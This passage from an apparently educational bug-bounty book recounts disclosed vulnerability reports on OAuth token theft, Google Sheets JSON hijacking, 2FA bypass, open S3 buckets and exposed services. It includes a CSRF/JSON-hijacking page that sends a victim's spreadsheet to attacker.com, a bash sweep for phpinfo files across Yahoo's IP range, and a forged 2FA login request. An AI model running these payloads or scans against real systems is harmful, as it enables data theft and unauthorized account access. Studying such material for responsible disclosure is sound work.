Facebook Fan Pages. The list of apps\nis available by visiting https://www.facebook.com/search/me/apps-used.\nLookingthroughthatlist,Philippemanagedtofindanappwhichwasmisconfiguredand\ncould be abused to capture tokens with a request that looked like:\n2http://philippeharewood.com/swiping-facebook-official-access-tokens\nOAuth 164\nhttps://facebook.com/v2.5/dialog/oauth?response_type=token&display=popup&client_\\\nid=APP_ID&redirect_uri=REDIRECT_URI\nHere,theapplicationthathewouldusefortheAPP_IDwasonethathadfullpermissions\nalready authorized and misconfigured - meaning step #1 and #2 from the process\ndescribed in the OAuth Description were already completed and the user wouldn’t get\na pop up to grant permission to the app because they had actually already done so!\nAdditionally,sincetheREDIRECT_URIwasn’townedbyFacebook,Philippecouldactually\ntake it over. As a result, when a user clicked on his link, they’ll be redirected to:\nhttp://REDIRECT_URI/access_token_appended_here\nPhilippecouldusethisaddresstologallaccesstokensandtakeoverFacebookaccounts!\nWhat’s even more awesome, according to his post, once you have an official Facebook\naccess token, you have access to tokens from other Facebook owned properties, like\nInstagram! All he had to do was make a call to Facebook GraphQL (an API for querying\ndata from Facebook) and the response would include an access_token for the app in\nquestion.\nTakeaways\nWhen looking for vulnerabilities, consider how stale assets can be exploited.\nWhenyou’rehacking,beonthelookoutforapplicationchangeswhichmayleave\nresourcesliketheseexposed.ThisexamplefromPhilippeisawesomebecauseit\nstartedwithhimidentifyinganendgoal,stealingOAuthtokens,andthenfinding\nthemeanstodoso.\nAdditionally, if you liked this example, you should check out Philippe’s Blog3\n(included in the Resources Chapter) and the Hacking Pro Tips Interview he sat\ndownwithmetodo-heprovidesalotofgreatadvice!.\n2. Stealing Slack OAuth Tokens\nDifficulty: Low\nUrl: https://slack.com/oauth/authorize\nReport Link: https://hackerone.com/reports/25754\nDate Reported: May 1, 2013\nBounty Paid: $100\n3https://www.philippeharewood.com\n4http://hackerone.com/reports/2575\nOAuth 165\nDescription:\nIn May 2013, Prakhar Prasad5 reported to Slack that he was able to by-pass their\nredirect_uri restrictions by adding a domain suffix to configured permitted redirect\ndomain.\nSo, in his example, he created a new app at https://api.slack.com/applications/new\nwith a redirect_uri configured to https://www.google.com. So, testing this out, if he\ntried redirect_uri=http://attacker.com, Slack denied the request. However, if he sub-\nmitted redirect_uri=www.google.com.mx, Slack permitted the request. Trying redirect_-\nuri=www.google.com.attacker.com was also permitted.\nAs a result, all an attacker had to do was create the proper sub domain on their site\nmatchingthevalidredirect_uriregisteredfortheSlackapp,havethevictimvisittheURL\nand Slack would send the token to the attacker.\nTakeaways\nWhile a little old, this vulnerability demonstrates how OAuth redirect_uri vali-\ndations can be misconfigured by resource servers. In this case, it was Slack’s\nimplementation of OAuth which permitted an attacker to add domain suffixes\nandstealtokens.\n3. Stealing Google Drive Spreadsheets\nDifficulty: Medium\nUrl: https://docs.google.com/spreadsheets/d/KEY\nReport Link: https://rodneybeede.com6\nDate Reported: October 29, 2015\nBounty Paid: Undisclosed\nDescription:\nInOctober2015,RodneyBeedefoundaninterestingvulnerabilityinGooglewhichcould\nhaveallowedanattackertostealspreadsheetsiftheyknewthespreadsheetID.Thiswas\nthe result of a combination of factors, specifically that Google’s HTTP GET requests did\nnot include an OAuth token, which created a CSRF vulnerability, and the response was\na valid Javascript object containing JSON. Reaching out to him, he was kind enough to\nallow the example to be shared.\nPrior to the fix, Google’s Visualization API enabled developers to query Google Sheets\nfor information from spreadsheets stored in Google Drive. This would be accomplished\na HTTP GET request that looked like:\n5https://hackerone.com/prakharprasad\n6https://www.rodneybeede.com/Google_Spreadsheet_Vuln_-_CSRF_and_JSON_Hijacking_allows_data_theft.html\nOAuth 166\nhttps://docs.google.com/spreadsheets/d/ID/gviz/tq?headers=2&amp;range=A1:H&amp;s\\\nheet=Sheet1&amp;tqx=reqId%3A0\nThe details of the URL aren’t important so we won’t break it down. What is important is\nwhenmakingthisrequest,GoogledidnotincludeorvalidateasubmittedOAauthtoken,\nor any other type of CSRF protection. As a result, an attacker could invoke the request\non behalf of the victim via a malicious web page (example courtesy of Rodney):\n1 <html>\n2 <head>\n3 <script>\n4 vargoogle=newObject();\n5 google.visualization=newObject();\n6 google.visualization.Query=newObject();\n7 google.visualization.Query.setResponse=function(goods){\n8 google.response=JSON.stringify(goods,undefined,2);\n9 }\n10 </script>\n11\n12 <!--ReturnsJavascriptwithembeddedJSONstringasanargument-->\n13 <scripttype=\"text/javascript\"src=\"https://docs.google.com/spreadsheets/d/1\\\n14 bWK2wx57QJLCsWh-jPQS07-2nkaiEaXPEDNGoVZwjOA/gviz/tq?headers=2&amp;range=A1:H&amp\\\n15 ;sheet=Sheet1&amp;tqx=reqId%3A0\"></script>\n16\n17 <script>\n18 functionsmuggle(goods){\n19 document.getElementById('cargo').innerText=goods;\n20 document.getElementById('hidden').submit();\n21 }\n22 </script>\n23 </head>\n24\n25 <bodyonload=\"smuggle(google.response);\">\n26 <formaction=\"https://attacker.com/capture.php\"method=\"POST\"id=\"hidden\">\n27 <textareaid=\"cargo\"name=\"cargo\"rows=\"35\"cols=\"70\"></textarea>\n28 </form>\n29\n30 </body>\n31 </html>\nLet’sbreakthisdown.AccordingtoGoogle’sdocumentation7,JSONresponseincludethe\ndata in a Javascript object. If a request does not include a responseHandler value, the\n7https://developers.google.com/chart/interactive/docs/dev/implementing_data_source#json-response-format\nOAuth 167\ndefault value is google.visualization.Query.setResponse. So, with these in mind, the\nscript on line 3 begins creating the objects we need to define an anonymous function\nwhichwillbecalledforsetResponsewhenwereceiveourdatawiththeJavascriptobject\nfrom Google.\nSo,online8,wesettheresponseonthegoogleobjecttotheJSONvalueoftheresponse.\nSince the object simply contains valid JSON, this executes without any problem. Here’s\nan example response after it’s been stringified (again, courtesy of Rodney):\n{\n\"version\":\"0.6\",\n\"reqId\":\"0\",\n\"status\":\"ok\",\n\"sig\":\"405162961\",\n\"table\":{\n\"cols\":[\n{\n\"id\":\"A\",\n\"label\":\"Account#12345\",\n...\nNow, at this point, astute readers might have wondered, what happed to Cross Origin\nResource Sharing protections? How can our script access the response from Google\nand use it? Well, turns out since Google is returning a Javascript object which contains\na JSON array and that object is not anonymous (i.e., the default value will be part of\nsetResponse), the browser treats this as valid Javascript thus enabling attackers to read\nand use it. Think of the inclusion of a legitimate script from a remote site in your own\nHTML,sameidea.HadthescriptsimplycontainedaJSONobject,itwouldnothavebeen\nvalid Javascript and we could not have accessed it.\nAs a quick aside, this type of vulnerability has been around for a while, known as JSON\nhijacking. Exploiting this used to be possible for anonymous Javascript objects as well\nbyoverridingtheJavascriptObject.prototype.defineSettermethodbutthiswasfixedin\nChrome 27, Firefox 21 and IE 10.\nGoing back to Rodney’s example, when our malicious page is loaded, the onload event\nhandlerforourbodytagonline25willexecutethefunctionsmugglefromline18.Here,\nwegetthetextareaelementcargoinourformonline27andwesetthetexttoourspread\nsheet response. We submit the form to Rodney’s website and we’ve successfully stolen\ndata.\nInterestingly, according to Rodney’s interaction with Google, changing this wasn’t a\nsimplefixandrequiredchangestotheAPIitself.Asaresult,whilehereportedonOctober\n29, 2015, this wasn’t resolved until September 15, 2016.\nOAuth 168\nTakeaways\nThereareafewtakeawayshere.First,OAuthvulnerabilitiesaren’talwaysabout\nstealing tokens. Keep an eye out for API requests protected by OAuth which\naren’tsendingorvalidatingthetoken(i.e.,tryremovingtheOAuthtokenheader\nif there’s an identifier, like the sheets ID, in the URL). Secondly, it’s important\nto recognize and understand how browsers interpret Javascript and JSON. This\nvulnerability was partly made possible since Google was returning a valid\nJavascriptobjectwhichcontainedJSONaccessibleviasetResponse.Haditbeen\nananonymousJavascriptarray,itwouldnothavebeenpossible.Lastly,whileit’s\nacommonthemeinthebook,readthedocumentation.Google’sdocumentation\nabout responses was key to developing a working proof of concept which sent\nthespreadsheetdatatoaremoteserver.\nSummary\nOAuth can be a complicated process to wrap your head around when you are first\nlearning about it, or at least it was for me and the hackers I talked to and learned from.\nHowever, once you understand it, there is a lot of potential for vulnerabilities given\nit’s complexity. When testing things out, be on the lookout for creative solutions like\nPhilippe’s taking over of third party apps and abusing domain suffixes like Prakhar.\n20. Application Logic Vulnerabilities\nDescription\nApplicationlogicvulnerabilitiesaredifferentfromtheothertypeswe’vebeendiscussing\nthus far. Whereas HTML Injection, HTML Parameter Pollution, XSS, etc. all involve\nsubmitting some type of potentially malicious input, application logic vulnerabilities\nreally involve manipulating scenarios and exploiting bugs in the web app coding and\ndevelopment decisions.\nAnotableexampleofthistypeofattackwaspulledoffbyEgorHomakovagainstGitHub\nwhich uses Ruby on Rails. If you’re unfamiliar with Rails, it is a very popular web\nframework which takes care of a lot of the heavy lifting when developing a web site.\nInMarch2012,EgorflaggedfortheRailsCommunitythatbydefault,Railswouldaccept\nall parameters submitted to it and use those values in updating database records\n(dependent on the developers implementation). The thinking by Rails core developers\nwas that web developers using Rails should be responsible for closing this security\ngap and defining which values could be submitted by a user to update records. This\nbehaviourwasalreadywellknownwithinthecommunitybutthethreadonGitHubshows\nhow few appreciated the risk this posed https://github.com/rails/rails/issues/52281.\nWhenthecoredevelopersdisagreedwithhim,Egorwentontoexploitanauthentication\nvulnerability on GitHub by guessing and submitting parameter values which included\na creation date (not overly difficult if you have worked with Rails and know that most\nrecordsincludeacreatedandupdatedcolumninthedatabase).Asaresult,hecreateda\nticketonGitHubwiththedateyearsinthefuture.HealsomanagedtoupdateSSHaccess\nkeys which permitted him access to the official GitHub code repository.\nAs mentioned, the hack was made possible via the back end GitHub code which did not\nproperly authenticate what Egor was doing, i.e, that he should not have had permission\ntosubmitvaluesforthecreationdate,whichsubsequentlywereusedtoupdatedatabase\nrecords.Inthiscase,Egorfoundwhatwasreferredtoasamassassignmentvulnerability.\nApplicationlogicvulnerabilitiesarealittletrickiertofindcomparedtoprevioustypesof\nattacksdiscussedbecausetheyrelyoncreativethinkingaboutcodingdecisionsandare\nnotjustamatterofsubmittingpotentiallymaliciouscodewhichdevelopersdon’tescape\n(not trying to minimize other vulnerability types here, some XSS attacks are beyond\ncomplex!).\n1https://github.com/rails/rails/issues/5228\nApplicationLogicVulnerabilities 170\nWith the example of GitHub, Egor knew that the system was based on Rails and how\nRailshandleduserinput.Inotherexamples,itmaybeamatterofmakingdirectAPIcalls\nprogrammaticallytotestbehaviourwhichcomplimentsawebsiteasseenwithShopify’s\nAdministrator Privilege Bypass below. Or, it’s a matter of reusing returned values from\nauthenticatedAPIcallstomakesubsequentAPIcallswhichyoushouldnotbepermitted\nto do.\nExamples\n1. Shopify Administrator Privilege Bypass\nDifficulty: Low\nUrl: shop.myshopify.com/admin/mobile_devices.json\nReport Link: https://hackerone.com/reports/1009382\nDate Reported: November 22, 2015\nBounty Paid: $500\nDescription:\nShopify is a huge and robust platform which includes both a web facing UI and\nsupporting APIs. In this example, the API did not validate some permissions which the\nweb UI apparently did. As a result, store administrators, who were not permitted to\nreceive email notifications for sales, could bypass that security setting by manipulating\nthe API endpoint to receive notifications to their Apple devices.\nAccording to the report, the hacker would just have to:\n• Log in to the Shopify phone app with a full access account\n• Intercept the request to POST /admin/mobile_devices.json\n• Remove all permissions of that account\n• Remove the mobile notification added\n• Replay the request to POST /admin/mobile_devices.json\nAfter doing so, that user would receive mobile notifications for all orders placed to the\nstore thereby ignoring the store’s configured security settings.\n2https://hackerone.com/reports/100938\nApplicationLogicVulnerabilities 171\nTakeaways\nTherearetwokeytakeawayshere.First,noteverythingisaboutinjectingcode,\nHTML,etc.Alwaysremembertouseaproxyandwatchwhatinformationisbeing\npassedtoasiteandplaywithittoseewhathappens.Inthiscase,allittookwas\nremoving POST parameters to bypass security checks. Secondly, again, not all\nattacksarebasedonHTMLwebpages.APIendpointsalwayspresentapotential\nareaforvulnerabilitysomakesureyouconsiderandtestboth.\n2. HackerOne Signal Manipulation\nDifficulty: Low\nUrl: hackerone.com/reports/XXXXX\nReport Link: https://hackerone.com/reports/1063053\nDate Reported: December 21, 2015\nBounty Paid: $500\nDescription:\nAt the end of 2015, HackerOne introduced new functionality to the site called Signal.\nEssentially, it helps to identify the effectiveness of a Hacker’s previous vulnerability\nreports once those reports are closed. It’s important to note here, that users can close\ntheir own reports on HackerOne which is supposed to result in no change for their\nReputation and Signal￿\nSo, as you can probably guess, in testing the functionality out, a hacker discovered that\nthe functionality was improperly implemented and allowed for a hacker to create a\nreport to any team, self close the report and receive a Signal boost.\nAnd that’s all there was to it￿\nTakeaways\nThough a short description, the takeaway here can’t be overstated, be on the\nlookoutfornewfunctionality!.Whenasiteimplementsnewfunctionality,it’s\nfresh meat. New functionality represents the opportunity to test new code and\nsearch for bugs. This was the same for the Shopify Twitter CSRF and Facebook\nXSSvulnerabilities.\nTomakethemostofthis,it’sagoodideatofamiliarizeyourselfwithcompanies\nand subscribe to company blogs, newsletters, etc. so you’re notified when\nsomethingisreleased.Thentestaway.\n3https://hackerone.com/reports/106305\nApplicationLogicVulnerabilities 172\n3. Shopify S3 Buckets Open\nDifficulty: Medium\nUrl: cdn.shopify.com/assets\nReport Link: https://hackerone.com/reports/988194\nDate Reported: November 9, 2015\nBounty Paid: $1000\nDescription:\nAmazon Simple Storage, S3, is a service that allows customers to store and serve files\nfrom Amazon’s cloud servers. Shopify, and many sites, use S3 to store and serve static\ncontent like images.\nTheentiresuiteofAmazonWebServices,AWS,isveryrobustandincludesapermission\nmanagement system allowing administrators to define permissions, per service, S3\nincluded. Permissions include the ability to create S3 buckets (a bucket is like a storage\nfolder), read from buckets and write to buckets, among many others.\nAccording to the disclosure, Shopify didn’t properly configure their S3 buckets permis-\nsions and inadvertently allowed any authenticated AWS user to read or write to their\nbuckets. This is obviously problematic because you wouldn’t want malicious black hats\nto use your S3 buckets to store and serve files, at a minimum.\nUnfortunately,thedetailsofthisticketweren’tdisclosedbutit’slikelythiswasdiscovered\nwith the AWS CLI, a toolkit which allows you to interact with AWS services from your\ncommandline.WhileyouwouldneedanAWSaccounttodothis,creatingoneisactually\nfree as you don’t need to enable any services. As a result, with the CLI, you could\nauthenticate yourself with AWS and then test out the access (This is exactly how I found\nthe HackerOne bucket listed below).\nTakeaways\nWhenyou’rescopingoutapotentialtarget,ensuretonoteallthedifferenttools,\nincludingwebservices,theyappeartobeusing.Eachservice,software,OS,etc.\nyoucanfindrevealsapotentialnewattackvector.Additionally,itisagoodidea\nto familiarize yourself with popular web tools like AWS S3, Zendesk, Rails, etc.\nthatmanysitesuse.\n4. HackerOne S3 Buckets Open\nDifficulty: Medium\n4https://hackerone.com/reports/98819\nApplicationLogicVulnerabilities 173\nUrl: [REDACTED].s3.amazonaws.com\nReport Link: https://hackerone.com/reports/1280885\nDate Reported: April 3, 2016\nBounty Paid: $2,500\nDescription:\nWe’re gonna do something a little different here. This is a vulnerability that I actually\ndiscovered and it’s a little different from Shopify bug described above so I’m going to\nshareeverythingindetailabouthowIfoundthis,usingacoolscriptandsomeingenuity.\nDuringtheweekendofApril3,Idon’tknowwhybutIdecidedtotryandthinkoutsideof\ntheboxandattackHackerOne.Ihadbeenplayingwiththeirsitesincethebeginningand\nkeptkickingmyselfintheasseverytimeanewvulnerabilitywithinformationdisclosure\nwasfound,wonderinghowImissedit.IwonderediftheirS3bucketwasvulnerablelike\nShopify’s.IalsokeptwonderinghowthehackeraccessedtheShopifybucket￿Ifigured\nit had to be using the Amazon Command Line Tools.\nNow, normally I would have stopped myself figuring there was no way HackerOne was\nvulnerableafterallthistime.Butoneofthemanythingswhichstuckouttomefrommy\ninterviewwithBenSadeghipour(@Nahamsec)wastonotdoubtmyselfortheabilityfor\na company to make mistakes.\nSo I searched Google for some details and came across two interesting pages:\nThere’s a Hole in 1,951 Amazon S3 Buckets6\nS3 Bucket Finder7\nThefirstisaninterestingarticlefromRapid7,asecuritycompany,whichtalksabouthow\ntheydiscoveredS3bucketsthatwerepubliclywritableanddiditwithfuzzing,orguessing\nthe bucket name.\nThe second is a cool tool which will take a word list and call S3 looking for buckets.\nHowever, it doesn’t come with its own list. But there was a key line in the Rapid7 article,\n“￿Guessingnamesthroughafewdifferentdictionaries￿ListofFortune1000company\nnames with permutations on .com, -backup, -media￿\nThiswasinteresting.IquicklycreatedalistofpotentialbucketnamesforHackerOnelike\nhackerone, hackerone.marketing, hackerone.attachments, hackerone.users,\nhackerone.files, etc.\n5https://hackerone.com/reports/128088\n6https://community.rapid7.com/community/infosec/blog/2013/03/27/1951-open-s3-buckets\n7https://digi.ninja/projects/bucket_finder.php\nApplicationLogicVulnerabilities 174\nNone of these are the real bucket - they redacted it from the report so I’m honouring\nthat though I’m sure you might be able to find it too. I’ll leave that for a challenge.\nNow, using the Ruby script, I started calling the buckets. Right away things didn’t look\ngood.Ifoundafewbucketsbutaccesswasdenied.NolucksoIwalkedawayandwatched\nNetFlix.\nBut this idea was bugging me. So before going to bed, I decided to run the script again\nwith more permutations. I again found a number of buckets that looked like they could\nbe HackerOne’s but all were access denied. I realized access denied at least told me the\nbucket existed.\nI opened the Ruby script and realized it was calling the equivalent of the ls function on\nthebuckets.Inotherwords,itwastryingtoseeiftheywerereadable-Iwantedtoknow\nthat AND if they were publicly WRITABLE.\nNow, as an aside, AWS provides a Command Line tool, aws-cli. I know this because I’ve\nused it before, so a quick sudo apt-get install aws-cli on my VM and I had the tools. I set\nthem up with my own AWS account and was ready to go. You can find instructions for\nthis at docs.aws.amazon.com/cli/latest/userguide/installing.html\nNow,thecommandawss3helpwillopentheS3helpanddetailtheavailablecommands,\nsomethinglike6atthetimeofwritingthis.Oneofthoseismvintheformof awss3mv\n[FILE] [s3://BUCKET]. So in my case I tried:\ntouchtest.txt\nawss3mvtest.txts3://hackerone.marketing\nThiswasthefirstbucketwhichIreceivedaccessdeniedforAND￿“movefailed:./test.txt\ntos3://hackerone.marketing/test.txtAclienterror(AccessDenied)occurredwhencalling\nthe PutObject operation: Access Denied.”\nSo I tried the next one aws s3 mv test.txt s3://hackerone.files AND￿ SUCCESS! I got\nthe message “move: ./test.txt to s3://hackerone.files/test.txt”\nAmazing! Now I tried to delete the file: aws s3 rm s3://hackerone.files/test.txt AND\nagain, SUCCESS!\nBut now the self-doubt. I quickly logged into HackerOne to report and as I typed, I\nrealized I couldn’t actually confirm ownership of the bucket￿ AWS S3 allows anyone to\ncreate any bucket in a global namespace. Meaning, you, the reader, could have actually\nowned the bucket I was hacking.\nIwasn’t sureI should reportwithout confirming. Isearched Google tosee if Icould find\nanyreferencetothebucketIfound￿nothing.Iwalkedawayfromthecomputertoclear\nmyhead.Ifigured,worstthing,I’dgetanotherN/Areportand-5rep.Ontheotherhand,\nI figured this was worth at least $500, maybe $1000 based on the Shopify vulnerability.\nApplicationLogicVulnerabilities 175\nIhitsubmitandwenttobed.WhenIwokeup,HackerOnehadrespondedcongratulating\nthe find, that they had already fixed it and in doing so, realized a few other buckets\nthat were vulnerable. Success! And to their credit, when they awarded the bounty, they\nfactoredinthepotentialseverityofthis,includingtheotherbucketsIdidn’tfindbutthat\nwere vulnerable.\nTakeaways\nThereareamultipletakeawaysfromthis:\n1. Don’t underestimate your ingenuity and the potential for errors from\ndevelopers. HackerOne is an awesome team of awesome security re-\nsearchers.Butpeoplemakemistakes.Challengeyourassumptions.\n2. Don’t give up after the first attempt. When I found this, browsing each\nbucketwasn’tavailableandIalmostwalkedaway.ButthenItriedtowrite\nafileanditworked.\n3. It’sallabouttheknowledge.Ifyouknowwhattypesofvulnerabilitiesexist,\nyouknowwhattolookforandtest.Buyingthisbookwasagreatfirststep.\n4. I’ve said it before, I’ll say it again, an attack surface is more than the\nwebsite,it’salsotheservicesthecompanyisusing.Thinkoutsidethebox.\n5. Bypassing GitLab Two Factor Authentication\nDifficulty: Medium\nUrl: n/a\nReport Link: https://hackerone.com/reports/1280858\nDate Reported: April 3, 2016\nBounty Paid: n/a\nDescription:\nOn April 3, Jobert Abma (Co-Founder of HackerOne) reported to GitLab that with two\nfactorauthenticationenabled,anattackerwasabletologintoavictim’saccountwithout\nactually knowing the victim’s password.\nFor those unfamiliar, two factor authentication is a two step process to logging in -\ntypically a user enters their username and password and then the site will send an\nauthorization code, usually via email or SMS, which the user has to enter to finish the\nlogin process.\n8https://hackerone.com/reports/128085\nApplicationLogicVulnerabilities 176\nIn this case, Jobert noticed that during the sign in process, once an attacker entered his\nuser name and password, a token was sent to finalize the login. When submitting the\ntoken, the POST call looked like:\nPOST/users/sign_inHTTP/1.1\nHost:159.xxx.xxx.xxx\n...\n----------1881604860\nContent-Disposition:form-data;name=\"user[otp_attempt]\"\n212421\n----------1881604860--\nIf an attacker intercepted this and added a username to the call, for example:\nPOST/users/sign_inHTTP/1.1\nHost:159.xxx.xxx.xxx\n...\n----------1881604860\nContent-Disposition:form-data;name=\"user[otp_attempt]\"\n212421\n----------1881604860\nContent-Disposition:form-data;name=\"user[login]\"\njohn\n----------1881604860--\nThe attacker would be able to log into John’s account if the otp_attempt token was valid\nfor John. In other words, during the two step authentication, if an attacker added a\nuser[login] parameter, they could change the account they were being logged into.\nNow, the only caveat here was that the attacker had to have a valid OTP token for\nthe victim. But this is where bruteforcing would come if. If the site administrators did\nnot implement rate limiting, Jobert may have been able to make repeated calls to the\nserver to guess a valid token. The likelihood of a successful attack would depend on the\ntransit time sending the request to the server and the length of time a token is valid but\nregardless, the vulnerability here is pretty apparent.\nApplicationLogicVulnerabilities 177\nTakeaways\nTwo factor authentication is a tricky system to get right. When you notice a site\nis using it, you’ll want to fully test out all functionality including token lifetime,\nmaximumnumberofattempts,reusingexpiredtokens,likelihoodofguessinga\ntoken,etc.\n6. Yahoo PHP Info Disclosure\nDifficulty: Medium\nUrl: http://nc10.n9323.mail.ne1.yahoo.com/phpinfo.php\nReportLink:https://blog.it-securityguard.com/bugbounty-yahoo-phpinfo-php-disclosure-\n2/9\nDate Disclosed: October 16, 2014\nBounty Paid: n/a\nDescription:\nWhilethisdidn’thaveahugepayoutlikesomeoftheothervulnerabilitiesI’veincluded(it\nactuallypaid$0whichissurprising!),thisisoneofmyfavoritereportsbecauseithelped\nteach me the importance of network scanning and automation.\nIn October 2014, Patrik Fehrenbach (who you should remember from Hacking Pro Tips\nInterview#2-greatguy!)foundaYahooserverwithanaccessiblephpinfo()file.Ifyou’re\nnotfamiliarwithphpinfo(),it’sasensitivecommandwhichshouldneverbeaccessiblein\nproduction,letalonebepubliclyavailable,asitdisclosesallkindsofserverinformation.\nNow, you may be wondering how Patrik found http://nc10.n9323.mail.ne1.yahoo.com\n- I sure was. Turns out he pinged yahoo.com which returned 98.138.253.109. Then he\npassed that to WHOIS and found out that Yahoo actually owned the following:\nNetRange:98.136.0.0-98.139.255.255\nCIDR:98.136.0.0/14\nOriginAS:\nNetName:A-YAHOO-US9\nNetHandle:NET-98-136-0-0-1\nParent:NET-98-0-0-0-0\nNetType:DirectAllocation\nRegDate:2007-12-07\nUpdated:2012-03-02\nRef:http://whois.arin.net/rest/net/NET-98-136-0-0-1\n9https://blog.it-securityguard.com/bugbounty-yahoo-phpinfo-php-disclosure-2/\nApplicationLogicVulnerabilities 178\nNotice the first line - Yahoo owns a massive block of ip addresses, from 98.136.0.0 -\n98.139.255.255, or 98.136.0.0/14 which is 260,000 unique IP adresses. That’s a lot of\npotential targets.\nPatrik then wrote a simple bash script to look for an available phpinfo file:\n#!/bin/bash\nforipain98.13{6..9}.{0..255}.{0..255};do\nwget-t1-T5http://${ipa}/phpinfo.php;done&\nRunning that, he found that random Yahoo server.\nTakeaways\nWhenhacking,consideracompany’sentireinfrastructurefairgameunlessthey\ntellyouit’soutofscope.Whilethisreportdidn’tpayabounty,IknowthatPatrik\nhasemployedsimilartechniquestofindsomesignificantfourfigurepayouts.\nAdditionally, you’ll notice there was 260,000 potential addresses here, which\nwould have been impossible to scan manually. When performing this type of\ntesting, automation is hugely important and something that should be em-\nployed.\n7. HackerOne Hacktivity Voting\nDifficulty: Medium\nUrl: https://hackerone.com/hacktivity\nReport Link: https://hackereone.com/reports/13750310\nDate Reported: May 10, 2016\nBounty Paid: Swag\nDescription:\nThough technically not really a security vulnerability in this case, this report is a great\nexample of how to think outside of the box.\nSome time in late April/early May 2016, HackerOne developed functionality for hackers\nto vote on reports via their Hacktivity listing. There was an easy way and hard way to\nknowthefunctionalitywasavailable.Viatheeasyway,aGETcallto/current_userwhen\nloggedinwouldincludehacktivity_voting_enabled:false.Thehardwayisalittlemore\ninteresting, where the vulnerability lies and why I’m including this report.\n10https://hackerone.com/reports/137503\nApplicationLogicVulnerabilities 179\nIfyouvisitthehacktivityandviewthepagesource,you’llnoticeitisprettysparse,justa\nfew divs and no real content.\nHackerOneHacktivityPageSource\nNow,ifyouwereunfamiliarwiththeirplatformanddidn’thaveapluginlikewappalyzer\ninstalled, just looking at this page source should tell you that the content is being\nrendered by Javascript.\nSo, with that in mind, if you open the devtools in Chrome or Firefox, you can check\nout the Javascript source code (in Chrome, you go to sources and on the left, top-\n>hackerone.com->assets->frontend-XXX.js). Chrome devtools comes with a nice {}\nprettyprintbuttonwhichwillmakeminifiedJavascriptreadable.YoucouldalsouseBurp\nand review the response returning this Javascript file.\nHerein lies the reason for inclusion, if you search the Javascript for POST you can find\na bunch of paths used by HackerOne which may not be readily apparent depending on\nyour permissions and what is exposed to you as content. One of which is:\nApplicationLogicVulnerabilities 180\nHackeroneApplicationJavascriptPOSTVoting\nAsyoucansee,wehavetwopathsforthevotingfunctionality.Atthetimeofthisreport,\nyou could actually make these calls and vote on the reports.\nNow, this is one way to find the functionality - in the report, the hacker used another\nmethod,byinterceptingresponsesfromHackerOne(presumablyusingatoollikeBurp),\nthey switched attributed returned as false with true. This then exposed the voting\nelements which when clicked, made the available POST and DELETE calls.\nThereasonwhyIwalkedyouthroughtheJavascriptisbecause,interactingwiththeJSON\nresponse may not always expose new HTML elements. As a result, navigating Javascript\nmay expose otherwise “hidden” endpoints to interact with.\nApplicationLogicVulnerabilities 181\nTakeaways\nJavascript source code provides you with actual source code from a target you\ncan explore. This is great because your testing goes from blackbox, having no\nidea what the back end is doing, to whitebox (though not entirely) where you\nhave insight into how code is being executed. This doesn’t mean you have to\nwalkthrougheveryline,thePOSTcallinthiscasewasfoundonline20570with\nasimplesearchforPOST.\n8. Accessing PornHub’s Memcache Installation\nDifficulty: Medium\nUrl: stage.pornhub.com\nReport Link: https://hackerone.com/reports/11987111\nDate Reported: March 1, 2016\nBounty Paid: $2500\nDescription:\nPrior to their public launch, PornHub ran a private bug bounty program on HackerOne\nwith a broad bounty scope of *.pornhub.com which, to most hackers means all sub\ndomains of PornHub are fair game. The trick is now finding them.\nIn his blog post, Andy Gill @ZephrFish12 explains why this is awesome, by testing the\nexisting of various sub domain names using a list of over 1 million potential names, he\ndiscovered approximately 90 possible hacking targets.\nNow, visiting all of these sites to see what’s available would take a lot of time so he\nautomated the process using the tool Eyewitness (included in the Tools chapter) which\ntakes screenshots from the URLs with valid HTTP / HTTPS pages and provides a nice\nreport of the sites listening on ports 80, 443, 8080 and 8443 (common HTTP and HTTPS\nports).\nAccording to his write up, Andy slightly switched gears here and used the tool Nmap\nto dig deeper in to the sub domain stage.pornhub.com. When I asked him why, he\nexplained, in his experience, staging and development servers are more likely to have\nmisconfigured security permissions than production servers. So, to start, he got the IP\nof the sub domain using the command nslookup:\nnslookup stage.pornhub.com\nServer: 8.8.8.8\n11https://hackerone.com/reports/119871\n12http://www.twitter.com/ZephrFish\nApplicationLogicVulnerabilities 182\nAddress: 8.8.8.8#53\nNon-authoritative answer:\nName: stage.pornhub.com\nAddress: 31.192.117.70\nI’ve also seen this done with the command, ping, but either way, he now had the IP\naddress of the sub domain and using the command sudo nmap -sSV -p- 31.192.117.70\n-oA stage__ph -T4 & he got:\nStarting Nmap 6.47 ( http://nmap.org ) at 2016-06-07 14:09 CEST\nNmap scan report for 31.192.117.70\nHost is up (0.017s latency).\nNot shown: 65532 closed ports\nPORT STATE SERVICE VERSION\n80/tcp open http nginx\n443/tcp open http nginx\n60893/tcp open memcache\nServicedetectionperformed.Pleasereportanyincorrectresultsathttp://nmap.org/submit/\n. Nmap done: 1 IP address (1 host up) scanned in 22.73 seconds\nBreaking the command down:\n• the flag -sSV defines the type of packet to send to the server and tells Nmap to try\nand determine any service on open ports\n• the -p- tells Nmap to check all 65,535 ports (by default it will only check the most\npopular 1,000)\n• 31.192.117.70 is the IP address to scan\n• -oA stage__ph tells Nmap to output the findings in its three major formats at once\nusing the filename stage__ph\n• -T4 defines the timing for the task (options are 0-5 and higher is faster)\nWith regards to the result, the key thing to notice is port 60893 being open and running\nwhat Nmap believes to be memcache. For those unfamiliar, memcache is a caching\nservicewhichuseskey-valuepairstostorearbitrarydata.It’stypicallyusedtohelpspeed\nup a website by service content faster. A similar service is Redis.\nFinding this isn’t a vulnerability in and of itself but it is a definite redflag (though\ninstallation guides I’ve read recommend making it inaccessible publicly as one security\nApplicationLogicVulnerabilities 183\nprecaution). Testing it out, surprising PornHub didn’t enable any security meaning Andy\ncouldconnecttotheservicewithoutausernameorpasswordvianetcat,autilityprogram\nused to read and write via a TCP or UDP network connection. After connecting, he just\nrancommandstogettheversion,stats,etc.toconfirmtheconnectionandvulnerability.\nHowever, a malicious attacker could have used this access to:\n• Cause a denial of service (DOS) by constantly writing to and erasing the cache\nthereby keeping the server busy (this depends on the site setup)\n• Cause a DOS by filling the service with junk cached data, again, depending on the\nservice setup\n• Executecross-sitescriptingbyinjectingamaliciousJSpayloadasvalidcacheddata\nto be served to users\n• 